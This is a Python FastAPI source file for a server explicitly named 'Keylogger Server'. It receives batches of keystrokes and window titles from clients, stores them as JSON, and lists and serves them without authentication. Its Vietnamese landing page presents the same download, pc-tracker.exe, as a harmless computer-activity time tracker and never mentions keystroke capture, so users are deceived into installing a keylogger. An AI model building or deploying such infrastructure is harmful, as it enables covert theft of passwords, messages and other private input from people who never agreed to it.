from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from datetime import datetime
import json
import os
from typing import List, Optional
import uvicorn

app = FastAPI(title="Keylogger Server", version="1.0.0")

# Data models
class KeylogData(BaseModel):
    timestamp: str
    keystroke: str
    window_title: Optional[str] = None

class KeylogBatch(BaseModel):
    client_id: str
    data: List[KeylogData]

# Create data directory if it doesn't exist
DATA_DIR = "data/keylogs"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Dist folder path for file downloads
DIST_DIR = "dist"

# Static files directory
STATIC_DIR = "static"
if not os.path.exists(STATIC_DIR):
    os.makedirs(STATIC_DIR)

# Assets directory
ASSETS_DIR = "assets"

# Mount static files
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
app.mount("/assets", StaticFiles(directory=ASSETS_DIR), name="assets")

@app.get("/", response_class=HTMLResponse)
async def landing_page():
    """
    Landing page for PC Tracker
    """
    html_content = """
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PC Tracker - Quản lý Thời gian Hoạt động Máy tính</title>
        <link rel="icon" type="image/x-icon" href="/assets/logo.ico">
        <link rel="shortcut icon" type="image/x-icon" href="/assets/logo.ico">
        <link rel="stylesheet" href="/static/style.css">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    </head>
    <body>
        <!-- Navigation Bar -->
        <nav class="navbar">
            <div class="nav-container">
                <div class="nav-logo">
                    <img src="/assets/logo.ico" alt="PC Tracker Logo" class="logo-icon">
                    <span>PC Tracker</span>
                </div>
                <div class="nav-menu">
                    <a href="#features" class="nav-link">Tính năng</a>
                    <a href="#about" class="nav-link">Giới thiệu</a>
                    <a href="#contact" class="nav-link">Liên hệ</a>
                    <a href="/download/pc-tracker.exe" class="download-btn">
                        <i class="fas fa-download"></i>
                        Tải xuống
                    </a>
                </div>
            </div>
        </nav>

        <!-- Hero Section -->
        <section class="hero">
            <div class="hero-container">
                <div class="hero-content">
                    <h1 class="hero-title">PC Tracker</h1>
                    <p class="hero-subtitle">Giải pháp quản lý thời gian hoạt động máy tính toàn diện</p>
                    <p class="hero-description">
                        PC Tracker cung cấp các công cụ mạnh mẽ để theo dõi thời gian hoạt động máy tính, 
                        ghi lại thời gian sử dụng và đảm bảo quản lý hiệu quả cho tổ chức của bạn.
                    </p>
                    <div class="hero-buttons">
                        <a href="/download/pc-tracker.exe" class="btn btn-primary">
                            <i class="fas fa-download"></i>
                            Tải xuống ngay
                        </a>
                        <a href="#features" class="btn btn-secondary">
                            <i class="fas fa-info-circle"></i>
                            Tìm hiểu thêm
                        </a>
                    </div>
                </div>
                <div class="hero-image">
                    <i class="fas fa-laptop-code"></i>
                </div>
            </div>
        </section>

        <!-- Features Section -->
        <section id="features" class="features">
            <div class="container">
                <h2 class="section-title">Tính năng chính</h2>
                <div class="features-grid">
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-clock"></i>
                        </div>
                        <h3>Ghi lại Thời gian Hoạt động</h3>
                        <p>Theo dõi và ghi lại thời gian hoạt động của máy tính với timestamp chính xác</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-chart-line"></i>
                        </div>
                        <h3>Thống kê Thời gian</h3>
                        <p>Phân tích và thống kê thời gian sử dụng máy tính theo ngày, tuần, tháng</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-server"></i>
                        </div>
                        <h3>Server Trung tâm</h3>
                        <p>Thu thập dữ liệu thời gian hoạt động từ nhiều máy tính về một server trung tâm</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-database"></i>
                        </div>
                        <h3>Lưu trữ Dữ liệu</h3>
                        <p>Lưu trữ dữ liệu thời gian hoạt động dưới định dạng JSON với cấu trúc rõ ràng</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-download"></i>
                        </div>
                        <h3>Tải xuống Báo cáo</h3>
                        <p>Dễ dàng tải xuống báo cáo thời gian hoạt động để phân tích và quản lý</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-user-clock"></i>
                        </div>
                        <h3>Quản lý Thời gian</h3>
                        <p>Quản lý và kiểm soát thời gian sử dụng máy tính của nhân viên hiệu quả</p>
                    </div>
                </div>
            </div>
        </section>

        <!-- About Section -->
        <section id="about" class="about">
            <div class="container">
                <div class="about-content">
                    <div class="about-text">
                        <h2>Về PC Tracker</h2>
                        <p>
                            PC Tracker là một giải pháp quản lý thời gian máy tính được thiết kế để giúp các tổ chức 
                            theo dõi và quản lý thời gian hoạt động của máy tính. Với giao diện web 
                            thân thiện và API mạnh mẽ, PC Tracker cung cấp khả năng quản lý thời gian hiệu quả.
                        </p>
                        <div class="about-features">
                            <div class="about-feature">
                                <i class="fas fa-check-circle"></i>
                                <span>Dễ dàng triển khai và sử dụng</span>
                            </div>
                            <div class="about-feature">
                                <i class="fas fa-check-circle"></i>
                                <span>Giao diện web hiện đại và responsive</span>
                            </div>
                            <div class="about-feature">
                                <i class="fas fa-check-circle"></i>
                                <span>Báo cáo thời gian chi tiết và chính xác</span>
                            </div>
                            <div class="about-feature">
                                <i class="fas fa-check-circle"></i>
                                <span>Hỗ trợ nhiều máy tính đồng thời</span>
                            </div>
                        </div>
                    </div>
                    <div class="about-stats">
                        <div class="stat">
                            <div class="stat-number">100%</div>
                            <div class="stat-label">Tự động</div>
                        </div>
                        <div class="stat">
                            <div class="stat-number">24/7</div>
                            <div class="stat-label">Theo dõi</div>
                        </div>
                        <div class="stat">
                            <div class="stat-number">∞</div>
                            <div class="stat-label">Máy tính</div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Contact Section -->
        <section id="contact" class="contact">
            <div class="container">
                <h2 class="section-title">Liên hệ & Hỗ trợ</h2>
                <div class="contact-content">
                    <div class="contact-info">
                        <div class="contact-item">
                            <i class="fas fa-envelope"></i>
                            <span>Email: support@pctracker.com</span>
                        </div>
                        <div class="contact-item">
                            <i class="fas fa-phone"></i>
                            <span>Hotline: 1900-xxxx</span>
                        </div>
                        <div class="contact-item">
                            <i class="fas fa-map-marker-alt"></i>
                            <span>Địa chỉ: Hà Nội, Việt Nam</span>
                        </div>
                    </div>
                    <div class="contact-actions">
                        <a href="/download/pc-tracker.exe" class="btn btn-primary">
                            <i class="fas fa-download"></i>
                            Tải xuống PC Tracker
                        </a>
                        <a href="/docs" class="btn btn-secondary">
                            <i class="fas fa-book"></i>
                            Xem API Documentation
                        </a>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="footer">
            <div class="container">
                <div class="footer-content">
                    <div class="footer-logo">
                        <img src="/assets/logo.ico" alt="PC Tracker Logo" class="logo-icon">
                        <span>PC Tracker</span>
                    </div>
                    <div class="footer-links">
                        <a href="#features">Tính năng</a>
                        <a href="#about">Giới thiệu</a>
                        <a href="#contact">Liên hệ</a>
                        <a href="/docs">API Docs</a>
                    </div>
                </div>
                <div class="footer-bottom">
                    <p>&copy; 2024 PC Tracker. Tất cả quyền được bảo lưu.</p>
                </div>
            </div>
        </footer>

        <script src="/static/script.js"></script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.get("/api/status")
async def api_status():
    return {"message": "Keylogger Server is running", "status": "active"}

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

@app.post("/keylog")
async def receive_keylog(keylog_batch: KeylogBatch):
    """
    Receive keylog data from client
    """
    try:
        # Create filename with client ID and timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{DATA_DIR}/keylog_{keylog_batch.client_id}_{timestamp}.json"
        
        # Prepare data for saving
        save_data = {
            "client_id": keylog_batch.client_id,
            "received_at": datetime.now().isoformat(),
            "total_keystrokes": len(keylog_batch.data),
            "data": [item.dict() for item in keylog_batch.data]
        }
        
        # Save to file
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(save_data, f, indent=2, ensure_ascii=False)
        
        return {
            "status": "success",
            "message": f"Saved {len(keylog_batch.data)} keystrokes",
            "filename": filename
        }
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error saving keylog data: {str(e)}")

@app.get("/keylogs")
async def list_keylogs():
    """
    List all saved keylog files
    """
    try:
        files = []
        for filename in os.listdir(DATA_DIR):
            if filename.startswith("keylog_") and filename.endswith(".json"):
                filepath = os.path.join(DATA_DIR, filename)
                stat = os.stat(filepath)
                files.append({
                    "filename": filename,
                    "size": stat.st_size,
                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
        
        return {"files": files, "total": len(files)}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error listing files: {str(e)}")

@app.get("/keylogs/{filename}")
async def get_keylog(filename: str):
    """
    Get specific keylog file content
    """
    try:
        filepath = os.path.join(DATA_DIR, filename)
        if not os.path.exists(filepath):
            raise HTTPException(status_code=404, detail="File not found")
        
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        return data
    
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="File not found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error reading file: {str(e)}")

@app.get("/files")
async def list_dist_files():
    """
    List all files in the dist folder available for download
    """
    try:
        if not os.path.exists(DIST_DIR):
            return {"files": [], "total": 0, "message": "Dist folder not found"}
        
        files = []
        for root, dirs, filenames in os.walk(DIST_DIR):
            for filename in filenames:
                filepath = os.path.join(root, filename)
                relative_path = os.path.relpath(filepath, DIST_DIR)
                stat = os.stat(filepath)
                files.append({
                    "filename": filename,
                    "relative_path": relative_path.replace("\\", "/"),  # Use forward slashes for URLs
                    "size": stat.st_size,
                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    "download_url": f"/download/{relative_path.replace(os.sep, '/')}"
                })
        
        return {"files": files, "total": len(files)}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error listing dist files: {str(e)}")

@app.get("/download/{file_path:path}")
async def download_file(file_path: str):
    """
    Download a file from the dist folder
    """
    try:
        # Construct the full file path
        full_path = os.path.join(DIST_DIR, file_path)
        
        # Security check: ensure the file is within the dist directory
        if not os.path.abspath(full_path).startswith(os.path.abspath(DIST_DIR)):
            raise HTTPException(status_code=403, detail="Access denied")
        
        # Check if file exists
        if not os.path.exists(full_path):
            raise HTTPException(status_code=404, detail="File not found")
        
        # Check if it's a file (not a directory)
        if not os.path.isfile(full_path):
            raise HTTPException(status_code=400, detail="Path is not a file")
        
        # Get filename for download
        filename = os.path.basename(full_path)
        
        # Return file for download
        return FileResponse(
            path=full_path,
            filename=filename,
            media_type='application/octet-stream'
        )
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error downloading file: {str(e)}")

if __name__ == "__main__":
    print("Starting Keylogger Server...")
    print("Server will be available at: http://localhost:8000")
    print("API documentation at: http://localhost:8000/docs")
    uvicorn.run(app, host="0.0.0.0", port=8000)
